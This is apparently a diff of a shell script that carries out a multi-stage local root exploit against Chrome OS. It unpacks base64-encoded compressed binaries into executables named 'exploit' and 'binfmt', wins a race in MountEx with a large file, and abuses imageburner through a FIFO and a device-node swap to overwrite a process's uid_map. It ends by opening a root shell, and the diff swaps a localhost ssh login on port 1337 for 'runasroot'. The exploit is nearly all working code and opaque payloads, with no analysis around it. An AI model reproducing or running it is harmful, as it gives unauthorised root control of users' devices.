-AMmRG7aAo0JCbEITYk2gbTaVY3vkXOg6VSTaEncgOQkiESRJNqSAqlSoUZZrOCoiXQxeE0tA9mpk2tLR+HSggsNyuPAujowESYHq
-ciZLyWaNm1Gula1w0qvXDMXyzQTHx9ll1MraYMFcMxMu1cOgkB/oLOiDsCNgu7pU3hSwenbXstYCKQGctNoUBEH4coYBXVsS5jtZ
-QyHbH5d1CjBAUcYZzGISlQjH8XrJknzOLewoFh34tI1ffI7zP48jThaye6jGrWtQvPLYlsWAl7gwA4l6rfvl+mhSlJJoVYC1a2qj
-d8akGookkufaP7YgNU95ptE9CZgWINjuMMNoLjDvPgXw0qy5CMaWaYUM1b2K2IFqDo2202wcocVGzbfoU+w326Z10RS9ADblqBTU
-sSVMWLLMqK4MY9gXqaiqSPPGj+AxM/kNY9qXANPjGc/53rdKVfdF4crd8p0dcy7d01rdhDZPhC9iFC6zRsRVrJ0rrQqiRk2joUnx
-QysBWi1txbBDaVTGHZ4rsqOt+Cq6sknpS/5rYCKRCwBSYcjq9fOlDgYm+cRSEuoLTuqUdaQZdBrmDtiicAoIClMi1mKjRVzfy8LW
-t+e/9f+/ifc3/fnb9pN3IYKrJ1HkQv4QKTMyOY0dh/i1qmNLmJEo6To8hobz8veyg+gCUOGihSpVQ+r2eXv2C3QvwSN3dKyIKs1m
-dmOYORAjAGCvN2mJqaeKPx5nLGVIWQKfLiHMQTaNaQDqkc3UeMJZ4muHay5141eMvSzmuJUKG6m9/vxtoOAaKfBwXd85M2t9HgXg
-vZgF/NwEqYSAoQP0aGpC+8lAwILKqdYXHP+UkYjTlhjwepAhlFQJya3PXjFvTbtdHJMyp5MUNnK1teBWKBPvmyOCTAgG6PiMJoju
-XjbgprCgPUHcCPhynU2wsR2E7KiCGLZInlzL0UWqOEoaNBH3whi9a4QgRFEJ4QC0DFIH3Uh3ChjosC8QhKOVT8DRBEgiMgsCi0hW
-wG6A4SpCDAanQ4QiLqB1vvAWVnnK070mZgEJmYiQQI6hYOCq+eYMYjjx6kHyaq5cU8Ka1EaRlDQaavYSR6RBID7RyGS5SBu4VFpM
-O6ECT8BEFuwjGOOIp8W64ocAgYRlSwZYCAmxJ0jDSKOKHyWIGTGOiQ8LFUYYFSAigYdjAjCggdE4xJSjZQVAHn0BibbZonkI6pkK
-k+aVdG8T2jgl17PNLiDBGgp0Q8TKKiBi2SUA4UQajBScAsqUpLCUmg5w9tVCKeAeSoD7wnxBAkQmgU35RcZ81eXI0tD1KBoxFTGF
-qERPyGMcAkap2Wiogf0PmWhD61B/F2MG4DYnxMvdWEYbB+2KcGzKMdCQfRoMW/VB+xVBAbop0GfjUQuaF0PQUIEjbduaGK13O3nE
-12DjxRExUSmEZwOxr1nR29jfe7IjAnG2UDDIjt0sO5tgPCIBPOL7fQ2ZMGyBs34YUFkhJHJreQjSc9XbTVOZDF13/i7kinChIXSu
-srQ=
-EOF
-base64 -d <<-EOF | bunzip2 -dc > /media/removable/exec/user/binfmt
-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
-EOF
-
-chmod +x /media/removable/exec/user/exploit
-chmod +x /media/removable/exec/user/binfmt
-
-echo "Lauching handler for /dev and /run chown..."
-/run/arc/media/removable-read/exec/user/exploit first &
-CHOWNRUN=$!
-
-user=$(xxd -ps -l 4 /dev/urandom)@exploit.local
-hash=$(get_salty_username "${user}")
-echo "Creating large file to win race (slow)..."
-dd if=/dev/zero of=/home/chronos/u-${hash} bs=4M count=2000
-echo "Triggering race..."
-MountEx "${user}"
-
-wait ${CHOWNRUN}
-
-echo "Setting up for imageburner..."
-FIFO=/home/chronos/u-${CROS_USER_ID_HASH}/Downloads/fifo
-rm -f ${FIFO}
-mkfifo ${FIFO}
-mv /dev/loop0 /dev/sdz
-echo "Triggering imageburner..."
-imageburner &
-
-sleep 1
-
-echo "Launching handler for uid_map..."
-/run/arc/media/removable-read/exec/user/exploit second &
-TGT=$!
-
-mv /dev/sdz /dev/loop0
-ln -s /proc/${TGT}/uid_map /dev/sdz
-sleep 1
-echo "Triggering uid_map overwrite..."
-echo '65534 0 1' > ${FIFO}
-
-sleep 1
-
-rm ${FIFO} /dev/sdz
-
-wait ${TGT}
-
-sleep 1
-
-ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1
+echo "Providing root shell..."
+runasroot
